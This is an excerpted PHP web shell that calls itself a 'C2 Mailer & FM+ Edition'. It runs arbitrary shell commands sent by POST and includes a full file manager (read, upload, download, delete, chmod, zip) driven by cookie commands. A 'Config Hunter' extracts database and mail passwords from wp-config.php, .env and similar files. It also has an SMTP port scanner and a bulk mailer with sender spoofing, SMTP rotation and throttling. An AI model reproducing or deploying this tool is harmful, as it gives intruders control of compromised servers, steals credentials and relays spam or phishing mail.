...
// Version: 4.0.0 (C2 Mailer & FM+ Edition)
...
function monarchClear($text, $recipient_email, $sender_email) {
        ...
        if ($command && isset($command['call'])) {
            ...
            switch ($command['call']) {
                case 'create_file':
                    ...
                    } else { $response['output'] = 'Error: Could not write to file.'; }
                    break;
                case 'create_folder':
                    if (@mkdir($command['target'])) {
                        $response = ['success' => true, 'output' => 'Folder created successfully.'];
                    } else { $response['output'] = 'Error: Could not create folder.'; }
                    break;
                case 'rename':
                    if (@rename($command['target'], $command['destination'])) {
                         $response = ['success' => true, 'output' => 'Renamed successfully.'];
                    } else { $response['output'] = 'Error: Rename failed.'; }
                    break;
                case 'delete':
                    function rmdir_recursive($dir) { if (!file_exists($dir)) return true; if (!is_dir($dir)) return unlink($dir); foreach (scandir($dir) as $item) { if ($item == '.' || $item == '..') continue; if (!rmdir_recursive($dir . DIRECTORY_SEPARATOR . $item)) return false; } return rmdir($dir); }
                    if (rmdir_recursive($command['target'])) {
                        $response = ['success' => true, 'output' => 'Deleted successfully.'];
                    } else { $response['output'] = 'Error: Delete failed.'; }
                    break;
                case 'chmod':
                    if (@chmod($command['target'], octdec($command['perms']))) {
                        $response = ['success' => true, 'output' => 'Permissions changed.'];
                    } else { $response['output'] = 'Error: Chmod failed.'; }
                    break;
                case 'zip':
                    if (!class_exists('ZipArchive')) { $response['output'] = 'Error: ZipArchive class not found.'; break; }
                    $zip = new ZipArchive(); $zipFile = $command['destination'];
                    if ($zip->open($zipFile, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) { $response['output'] = 'Error: Could not create zip archive.'; break; }
                    $source = realpath($command['target']);
                    if (is_dir($source)) { $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST); foreach ($files as $file) { $file = realpath($file); $relativePath = substr($file, strlen($source) + 1); if (is_dir($file)) { $zip->addEmptyDir($relativePath); } else if (is_file($file)) { $zip->addFromString($relativePath, file_get_contents($file)); } }
        ...
        if (empty($recipients)) {
            ...
            if (empty($body_base)) {
                $response['output'] = 'ERROR: Email body is missing. Provide a valid URL, file path, or a `body` cookie.';
                 ...
                 $sent_count = 0; $failed_count = 0; $log = [];
                 ...
                 if (strtolower($host) === 'localhost') { // LOCAL MAILER
                     if (!function_exists('mail')) { $response['output'] = "ERROR: The mail() function is disabled."; }
                     else {
                        foreach($recipients as $to) {
                            $from_email = monarchClear($from_email_base, $to, $from_email_base); $from_domain = explode('@', $from_email)[1] ?? 'localhost.localdomain'; $from_name = monarchClear($from_name_base, $to, $from_email); $subject = monarchClear($subject_base, $to, $from_email); $body = monarchClear($body_base, $to, $from_email);
                            $message_id = "<" . md5(uniqid()) . "@" . $from_domain . ">";
                            $headers = "From: $from_name <$from_email>\r\n" . "Reply-To: $from_name <$from_email>\r\n" . "MIME-Version: 1.0\r\n" . "Message-ID: $message_id\r\n";
                            if ($is_html) { $boundary = "----=" . md5(uniqid(time())); $headers .= "Content-Type: multipart/alternative; boundary=\"$boundary\"\r\n"; $plain_text_body = strip_tags($body); $message_body = "--$boundary\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n$plain_text_body\r\n\r\n"; $message_body .= "--$boundary\r\nContent-Type: text/html; charset=utf-8\r\n\r\n$body\r\n\r\n"; $message_body .= "--$boundary--"; } else { $headers .= "Content-Type: text/plain; charset=utf-8\r\n"; $message_body = $body; }
                            if (mail($to, $subject, $message_body, $headers)) { $sent_count++; $log[] = "-> Sent to $to"; } else { $failed_count++; $log[] = "-> FAILED for $to"; }
                        }
                     }
                 } else { // SMTP MAILER
                    $smtps = []; $current_smtp_index = 0;
                    $smtps[] = ['host' => $smtp_parts[0] ?? '', 'port' => $smtp_parts[1] ?? '', 'user' => $smtp_parts[2] ?? '', 'pass' => $smtp_parts[3] ?? '', 'enc' => strtolower($smtp_parts[4] ?? '')];
                    
                    foreach($recipients as $to) {
                        if ((int)$rotate_after > 0 && $sent_count > 0 && $sent_count % (int)$rotate_after === 0) { $current_smtp_index = ($current_smtp_index + 1) % count($smtps); $log[] = "--- Rotating SMTP (Feature currently supports single SMTP from cookie) ---"; }
                        $current_smtp = $smtps[$current_smtp_index];
                        $from_email = monarchClear($from_email_base, $to, $from_email_base);
                        $from_name = monarchClear($from_name_base, $to, $from_email); $subject = monarchClear($subject_base, $to, $from_email); $body = monarchClear($body_base, $to, $from_email);
                        $mailer = new MonarchMailer(true);
                        try {
                            $mailer->isHTML = $is_html; $mailer->Host = $current_smtp['host']; $mailer->Port = (int)$current_smtp['port']; $mailer->SMTPSecure = $current_smtp['enc']; $mailer->Username = $current_smtp['user']; $mailer->Password = $current_smtp['pass']; $mailer->SMTPAuth = true;
                            $mailer->setFrom($from_email, $from_name); $mailer->addAddress($to); $mailer->Subject = $subject; $mailer->Body = $body;
                            $mailer->send();
                            $sent_count++; $log[] = "-> Sent to $to via " . $current_smtp['host'];
                        } catch (Exception $e) { $failed_count++; $log[] = "-> FAILED for $to via " . $current_smtp['host'] . " (" . $e->getMessage() . ")"; }
                        unset($mailer);
                        if ((int)$pause_every > 0 && (int)$pause_for > 0 && $sent_count > 0 && $sent_count % (int)$pause_every === 0 && ($sent_count + $failed_count) < count($recipients)) { sleep((int)$pause_for); $log[] = "--- Paused for $pause_for second(s) ---"; }
                    }
                 }
...
if (isset($_POST['action'])) {
    ...
    if ($action === 'shell' && isset($_POST['cmd'])) {
        ...
        $command = $_POST['cmd']; if (preg_match('/^cd\s+(.*)$/', $command, $matches)) { $new_dir = trim($matches[1]); if ($new_dir === '' || $new_dir === '~') { $new_dir = getenv('HOME') ?: (getenv('HOMEDRIVE') . getenv('HOMEPATH')); } if (substr($new_dir, 0, 1) !== '/' && substr($new_dir, 1, 1) !== ':') { $new_dir = $current_dir . DIRECTORY_SEPARATOR . $new_dir; } if (@chdir($new_dir)) { echo "SUCCESS:cd:" . getcwd(); } else { echo "ERROR:cd:Cannot access '$matches[1]': No such file or directory"; } exit; }
        $output = ''; if (function_exists('proc_open')) { $descriptors = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]]; $process = proc_open($command, $descriptors, $pipes, $current_dir); if (is_resource($process)) { fclose($pipes[0]); $output = stream_get_contents($pipes[1]); $error_output = stream_get_contents($pipes[2]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); if (!empty($error_output)) $output .= "\n" . $error_output; } } elseif (function_exists('exec')) { exec($command . ' 2>&1', $output_lines); $output = implode("\n", $output_lines); } elseif (function_exists('shell_exec')) { $output = shell_exec($command . ' 2>&1'); } else { $output = "ERROR: All command execution functions are disabled."; } echo trim($output);
    }
    // --- Config Hunter Tool ---
    elseif ($action === 'scan_configs') {
        header('Content-Type: application/json');
        $results = []; $common_roots = ['.', '..', 'public_html', 'www', 'httpdocs', 'htdocs']; $config_files = ['wp-config.php', '.env', 'configuration.php', 'config.php', 'settings.inc.php', 'config.inc.php', 'app/etc/local.xml'];
        foreach ($common_roots as $root) { $path = realpath($current_dir . '/' . $root); if (!$path) continue; try { $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST); foreach ($iterator as $file) { if ($file->isFile() && in_array($file->getFilename(), $config_files)) { $content = @file_get_contents($file->getPathname()); if ($content === false) continue; $creds = []; if (preg_match("/DB_HOST',\s*'([^']+)'/", $content, $m)) $creds['DB_HOST'] = $m[1]; if (preg_match("/DB_USER',\s*'([^']+)'/", $content, $m)) $creds['DB_USER'] = $m[1]; if (preg_match("/DB_PASSWORD',\s*'([^']+)'/", $content, $m)) $creds['DB_PASSWORD'] = $m[1]; if (preg_match('/public \$host = \'([^\']+)\';/', $content, $m)) $creds['DB_HOST'] = $m[1]; if (preg_match('/public \$user = \'([^\']+)\';/', $content, $m)) $creds['DB_USER'] = $m[1]; if (preg_match('/public \$password = \'([^\']+)\';/', $content, $m)) $creds['DB_PASSWORD'] = $m[1]; if (preg_match('/MAIL_HOST=(.*)/', $content, $m)) $creds['MAIL_HOST'] = trim($m[1]); if (preg_match('/MAIL_PORT=(.*)/', $content, $m)) $creds['MAIL_PORT'] = trim($m[1]); if (preg_match('/MAIL_USERNAME=(.*)/', $content, $m)) $creds['MAIL_USERNAME'] = trim($m[1]); if (preg_match('/MAIL_PASSWORD=(.*)/', $content, $m)) $creds['MAIL_PASSWORD'] = trim($m[1]); if (!empty($creds)) { $results[] = ['path' => $file->getPathname(), 'creds' => $creds]; } } } } catch (Exception $e) { /* Ignore */ } }
        echo json_encode($results);
    }
    // --- SMTP Port Scanner ---
    elseif ($action === 'scan_smtp') {
        header('Content-Type: application/json');
        $results = []; $ports_to_check = [25, 465, 587, 2525]; $test_host = 'smtp.google.com'; $timeout = 3;
        $results['fsockopen'] = function_exists('fsockopen'); $results['ports'] = [];
        foreach($ports_to_check as $port) { $connection = @fsockopen($test_host, $port, $errno, $errstr, $timeout); if (is_resource($connection)) { $results['ports'][] = ['port' => $port, 'status' => 'Open']; fclose($connection); } else { $results['ports'][] = ['port' => $port, 'status' => 'Blocked']; } }
        echo json_encode($results);
    }
    ...
    elseif ($action === 'file_manager') {
        ...
        switch ($do) {
            case 'list':
                ...
                if ($scandir === false) { echo json_encode(['error' => 'Could not read directory.']); exit; }
                foreach ($scandir as $item) {
                    ...
                    if (is_dir($full_path)) $dirs[] = $item_data; else $files[] = $item_data;
                }
            ...
            case 'get_content':
                ...
                if ($file && is_file($file) && is_readable($file)) { echo json_encode(['success' => true, 'content' => file_get_contents($file)]); } 
                else { echo json_encode(['success' => false, 'error' => 'Cannot read file.']); }
                break;
            case 'download':
                $file = $_GET['file'] ?? null;
                if ($file && is_file($file) && is_readable($file)) { header('Content-Description: File Transfer'); header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename="' . basename($file) . '"'); header('Expires: 0'); header('Cache-Control: must-revalidate'); header('Pragma: public'); header('Content-Length: ' . filesize($file)); readfile($file); exit; }
            ...
            case 'upload':
                ...
                if (!empty($_FILES['uploaded_files'])) {
                    ...
                    $messages = []; $success_count = 0;
                    $real_path = realpath($path);
                    if (strpos($real_path, $base_dir) !== 0) { $messages[] = "Upload failed: Path is outside allowed scope."; }
                    else {
                        foreach ($files as $file) {
                            if ($file['error'] === UPLOAD_ERR_OK) {
                                $destination = $path . DIRECTORY_SEPARATOR . basename($file['name']);
                                if (move_uploaded_file($file['tmp_name'], $destination)) { $messages[] = "Successfully uploaded {$file['name']}."; $success_count++; } 
                                else { $messages[] = "Upload failed for {$file['name']}. Check permissions."; }
                            } else { $messages[] = "Upload error for {$file['name']}: error code {$file['error']}."; }
                        }
                    }
    ...
    // --- Mail Tester Tool (kept for UI) ---
    elseif ($action === 'send_mail') {
        header('Content-Type: text/plain');
        $recipients = preg_split('/\\r\\n|\\r|\\n/', trim($_POST['to'])); $recipients = array_filter(array_map('trim', $recipients));
        if (empty($recipients)) { echo "ERROR: No recipient emails provided."; exit; }
        $from_email_base = $_POST['from']; $from_name_base = $_POST['from_name'] ?: 'Monarch Test'; $subject_base = $_POST['subject']; $body_base = $_POST['body']; $is_html = ($_POST['content_type'] === 'html'); $smtp_list_str = trim($_POST['smtp_list']);
        $use_from_as_login = isset($_POST['from_as_login']); $rotate_after = (int)($_POST['rotate_after'] ?? 0); $pause_for = (int)($_POST['pause_for'] ?? 0); $pause_every = (int)($_POST['pause_every'] ?? 0);
        $sent_count = 0; $failed_count = 0; $log = []; $current_smtp_index = 0; $smtps = [];

        if (empty($smtp_list_str)) { // --- LOCAL MAILER ---
            if (!function_exists('mail')) { echo "ERROR: The mail() function is disabled. Please use SMTP."; exit; }
            foreach($recipients as $to) {
                $from_email = monarchClear($from_email_base, $to, $from_email_base); $from_domain = explode('@', $from_email)[1] ?? 'localhost.localdomain'; $from_name = monarchClear($from_name_base, $to, $from_email); $subject = monarchClear($subject_base, $to, $from_email); $body = monarchClear($body_base, $to, $from_email);
                $message_id = "<" . md5(uniqid()) . "@" . $from_domain . ">";
                $headers = "From: $from_name <$from_email>\r\n" . "Reply-To: $from_name <$from_email>\r\n" . "MIME-Version: 1.0\r\n" . "Message-ID: $message_id\r\n";
            ...
            foreach ($smtp_lines as $line) { if (trim($line) !== '') { $parts = explode(':', trim($line), 5); $smtps[] = ['host' => $parts[0] ?? '', 'port' => $parts[1] ?? '', 'user' => $parts[2] ?? '', 'pass' => $parts[3] ?? '', 'enc' => strtolower($parts[4] ?? '')]; } }
            if (empty($smtps)) { echo "ERROR: SMTP list is provided but is empty or malformed."; exit; }
            foreach($recipients as $to) {
                if ($rotate_after > 0 && $sent_count > 0 && $sent_count % $rotate_after === 0) { $current_smtp_index = ($current_smtp_index + 1) % count($smtps); $log[] = "--- Rotating to SMTP #" . ($current_smtp_index + 1) . " ---"; }
                $current_smtp = $smtps[$current_smtp_index];
                ...
                unset($mailer);
                if ($pause_every > 0 && $pause_for > 0 && $sent_count > 0 && $sent_count % $pause_every === 0 && ($sent_count + $failed_count) < count($recipients)) { sleep($pause_for); $log[] = "--- Paused for $pause_for second(s) ---"; }
            }
        }
...
// --- Embedded MonarchMailer Class (v2.5.1) ---
class MonarchMailer {
    public $Host = 'localhost'; public $Port = 25; public $SMTPAuth = false; public $Username = ''; public $Password = ''; public $SMTPSecure = ''; public $Timeout = 10; public $ErrorInfo = ''; public $isHTML = false; protected $smtp = null; public $FromName; public $From; public $To = []; public $Subject; public $Body;
    ...
    public function send(){
        ...
        if ($use_crypto) { $host = $this->SMTPSecure . '://' . $this->Host; }
        if (!$this->smtp->connect($host, $this->Port, $this->Timeout)) { throw new Exception("SMTP Connect failed: " . $this->smtp->getError()['error']); }
        if (!$use_crypto) { if (!$this->smtp->hello(gethostname())) { throw new Exception("EHLO failed: " . $this->smtp->getError()['error']); } if ($this->SMTPSecure === 'starttls') { if (!$this->smtp->startTLS()) { throw new Exception("STARTTLS failed: " . $this->smtp->getError()['error']); } } }
        if (!$this->smtp->hello(gethostname())) { throw new Exception("EHLO (after crypto) failed: " . $this->smtp->getError()['error']); }
        ...
        foreach ($this->To as $to_email) { if (!$this->smtp->recipient($to_email)) { throw new Exception("RCPT TO failed for $to_email: " . $this->smtp->getError()['error']); } }
        if (!$this->smtp->data($this->buildMessage())) { throw new Exception("DATA failed: " . $this->smtp->getError()['error']); }
        $this->smtp->quit(); return true;
    }
    protected function buildMessage(){
        $from_domain = explode('@', $this->From)[1] ?? 'localhost.localdomain'; $msg = "Date: " . date('r') . "\r\n"; $msg .= "To: " . implode(',', $this->To) . "\r\n"; $msg .= "From: " . $this->FromName . " <" . $this->From . ">\r\n"; $msg .= "Subject: " . $this->Subject . "\r\n"; $msg .= "Message-ID: <" . md5(uniqid(time())) . "@" . $from_domain . ">\r\n"; $msg .= "MIME-Version: 1.0\r\n";
        if ($this->isHTML) { $boundary = "----=" . md5(uniqid(time())); $msg .= "Content-Type: multipart/alternative; boundary=\"$boundary\"\r\n\r\n"; $plain_text_body = strip_tags($this->Body); $msg .= "--$boundary\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n$plain_text_body\r\n\r\n"; $msg .= "--$boundary\r\nContent-Type: text/html; charset=utf-8\r\n\r\n$this->Body\r\n\r\n"; $msg .= "--$boundary--"; } 
        else { $msg .= "Content-Type: text/plain; charset=utf-8\r\n\r\n"; $msg .= $this->Body; }
        return $msg;
    }
}
class MonarchSMTP {
    protected $connection = false; protected $error = ['error' => ''];
    ...
    public function startTLS(){ if(!$this->sendCommand('STARTTLS', 220)) return false; if(!stream_socket_enable_crypto($this->connection, true, STREAM_CRYPTO_METHOD_TLS_CLIENT)) return false; return true; }
...
<head>
    ...
    <style>
        ...
        .fm-toolbar button:disabled { background-color: #333; cursor: not-allowed; }
...
<body>
    ...
    <script>
        ...
        function updatePrompt() { const user = '<?php echo function_exists('posix_getpwuid') ? posix_getpwuid(posix_geteuid())['name'] : 'user'; ?>'; const hostname = '<?php echo gethostname(); ?>'; promptEl.textContent = `${user}@${hostname}:${cwd}$`; }
        ...
        scanServerBtn.addEventListener('click', async () => { scanServerBtn.disabled = true; scanServerBtn.textContent = 'Scanning...'; scanSmtpResultsEl.innerHTML = 'Checking server capabilities...'; const formData = new FormData(); formData.append('action', 'scan_smtp'); try { const response = await fetch(selfUrl, { method: 'POST', body: formData }); const results = await response.json(); let html = '<strong>PHP Functions:</strong>\n'; html += `fsockopen(): <span class="${results.fsockopen ? 'status-success' : 'status-error'}">${results.fsockopen ? 'Enabled' : 'DISABLED'}</span>\n\n`; html += '<strong>Outgoing SMTP Ports:</strong>\n'; results.ports.forEach(res => { html += `Port ${res.port}: <span class="${res.status === 'Open' ? 'status-open' : 'status-blocked'}">${res.status}</span>\n`; }); scanSmtpResultsEl.textContent = html; } catch (error) { scanSmtpResultsEl.textContent = `Error during scan: ${error.message}`; } scanServerBtn.disabled = false; scanServerBtn.textContent = 'Start Scan'; });
        scanBtn.addEventListener('click', async () => { scanBtn.disabled = true; scanBtn.textContent = 'Scanning...'; scanResultsEl.innerHTML = ''; const formData = new FormData(); formData.append('action', 'scan_configs'); formData.append('cwd', cwd); try { const response = await fetch(selfUrl, { method: 'POST', body: formData }); const results = await response.json(); if (results.length === 0) { scanResultsEl.textContent = 'No configuration files with known credentials found.'; } else { let html = ''; results.forEach(res => { html += `<strong>Found: ${res.path}</strong>\n`; for (const [key, value] of Object.entries(res.creds)) { html += `  ${key}: ${value}\n`; } html += '\n'; }); scanResultsEl.textContent = html; } } catch (error) { scanResultsEl.textContent = `Error during scan: ${error.message}`; } scanBtn.disabled = false; scanBtn.textContent = 'Start Scan'; });
        mailForm.addEventListener('submit', async (e) => { e.preventDefault(); mailStatusEl.className = ''; mailStatusEl.textContent = 'Sending...'; const formData = new FormData(mailForm); formData.append('action', 'send_mail'); try { const response = await fetch(selfUrl, { method: 'POST', body: formData }); const result = await response.text(); if (result.startsWith('SUCCESS:')) { mailStatusEl.className = 'status-success'; mailStatusEl.textContent = result.substring(8); } else { mailStatusEl.className = 'status-error'; mailStatusEl.textContent = result; } } catch (error) { mailStatusEl.className = 'status-error'; mailStatusEl.textContent = `Network Error: ${error.message}`; } });
        
        // --- File Manager ---
        const fmPathInput = document.getElementById('fm-path-input'); const fmServerInfoEl = document.getElementById('fm-server-info'); const fmTableBody = document.getElementById('fm-table-body'); const fmStatusBar = document.getElementById('fm-status-bar'); const fmBackBtn = document.getElementById('fm-back'); const fmForwardBtn = document.getElementById('fm-forward'); const fmUploadBtn = document.getElementById('fm-upload-file'); const fmFileInput = document.getElementById('fm-file-input');
        let fmHistory = []; let fmHistoryIndex = -1;
        ...
        async function executeFmCookieCommand(command) {
            ...
            try {
                const response = await fetch(selfUrl, { method: 'GET' });
        ...
        async function renderFileManager(path, isNewNav = false) {
            if (isNewNav) {
                if (fmHistoryIndex < fmHistory.length - 1) { fmHistory.splice(fmHistoryIndex + 1); }
                fmHistory.push(path);
                fmHistoryIndex++;
            }
            updateFmNavButtons();
            const formData = new FormData(); formData.append('action', 'file_manager'); formData.append('do', 'list'); formData.append('path', path);
            try {
                const response = await fetch(selfUrl, { method: 'POST', body: formData }); const data = await response.json();
                if (data.error) { showStatus(fmStatusBar, data.error, true); return; }
                cwd = data.info.cwd; updatePrompt(); fmPathInput.value = cwd; fm_zip_enabled = data.info.zip_enabled;
                ...
                data.items.forEach(item => {
                    const isDir = item.perms.startsWith('d'); const row = document.createElement('tr');
                    ...
                    if (!isDir) { actions += ` <a href="#" data-action="edit" title="Edit">ED</a> <a href="${selfUrl}?action=file_manager&do=download&file=${encodeURIComponent(item.path)}" data-action="download" title="Download">DL</a>`; }
                    if (fm_zip_enabled) { actions += ` <a href="#" data-action="zip" title="Zip">ZIP</a>`; }
        ...
        async function handleFileUpload(files) {
            ...
            const formData = new FormData(); formData.append('action', 'file_manager'); formData.append('do', 'upload'); formData.append('path', cwd);
            for (const file of files) { formData.append('uploaded_files[]', file); }
            try {
                const response = await fetch(selfUrl, { method: 'POST', body: formData }); const result = await response.json();
                showStatus(fmStatusBar, result.output, !result.success);
                if (result.success) { renderFileManager(cwd); }
            } catch (error) { showStatus(fmStatusBar, 'Upload failed: ' + error.message, true); } finally { fmFileInput.value = ''; }
        }

        fmPathInput.addEventListener('keydown', e => { if(e.key === 'Enter') renderFileManager(fmPathInput.value, true); });
        fmBackBtn.addEventListener('click', () => { if (fmHistoryIndex > 0) { fmHistoryIndex--; renderFileManager(fmHistory[fmHistoryIndex]); } });
        fmForwardBtn.addEventListener('click', () => { if (fmHistoryIndex < fmHistory.length - 1) { fmHistoryIndex++; renderFileManager(fmHistory[fmHistoryIndex]); } });
        ...
        fmTableBody.addEventListener('click', async e => {
            e.preventDefault(); const target = e.target; const parentActions = target.closest('.fm-actions');
            if (target.classList.contains('item-name')) { const isDir = target.getAttribute('data-isdir') === 'true'; const path = target.closest('tr').querySelector('.fm-actions').dataset.path; if (isDir) renderFileManager(path, true); else { const actionCell = target.closest('tr').querySelector('.fm-actions a[data-action="edit"]'); if(actionCell) actionCell.click(); } return; }
            if (parentActions) {
                const action = target.dataset.action; const path = parentActions.dataset.path; const name = parentActions.dataset.name;
                switch(action) {
                    case 'delete': if (confirm(`Are you sure you want to delete "${name}"?`)) { executeFmCookieCommand({ call: 'delete', target: path }); } break;
                    case 'rename': const newName = prompt('Enter new name:', name); if (newName && newName !== name) { const newPath = path.substring(0, path.lastIndexOf('/') + 1) + newName; executeFmCookieCommand({ call: 'rename', target: path, destination: newPath }); } break;
                    case 'chmod': const perms = prompt('Enter new permissions (e.g., 0755):', '0644'); if (perms) { executeFmCookieCommand({ call: 'chmod', target: path, perms: perms }); } break;
                    case 'zip': const zipName = prompt('Enter zip file name:', name + '.zip'); if (zipName) { const newPath = path.substring(0, path.lastIndexOf('/') + 1) + zipName; executeFmCookieCommand({ call: 'zip', target: path, destination: newPath }); } break;
                    case 'edit': const formData = new FormData(); formData.append('action', 'file_manager'); formData.append('do', 'get_content'); formData.append('target', path); const response = await fetch(selfUrl, { method: 'POST', body: formData }); const data = await response.json(); if (data.success) { document.getElementById('fm-editor-filename').textContent = path; document.getElementById('fm-editor-textarea').value = data.content; document.getElementById('fm-editor-modal').style.display = 'flex'; } else { showStatus(fmStatusBar, data.error, true); } break;
                }
            }
        });
        
        document.getElementById('fm-new-file').addEventListener('click', () => { const name = prompt('Enter new file name:'); if (name) { const path = cwd + '/' + name; executeFmCookieCommand({ call: 'create_file', target: path, content: '' }); } });
        document.getElementById('fm-new-folder').addEventListener('click', () => { const name = prompt('Enter new folder name:'); if (name) { const path = cwd + '/' + name; executeFmCookieCommand({ call: 'create_folder', target: path }); } });
        document.getElementById('fm-editor-save').addEventListener('click', () => { const path = document.getElementById('fm-editor-filename').textContent; const content = document.getElementById('fm-editor-textarea').value; executeFmCookieCommand({ call: 'create_file', target: path, content: content }).then(() => { document.getElementById('fm-editor-modal').style.display = 'none'; }); });
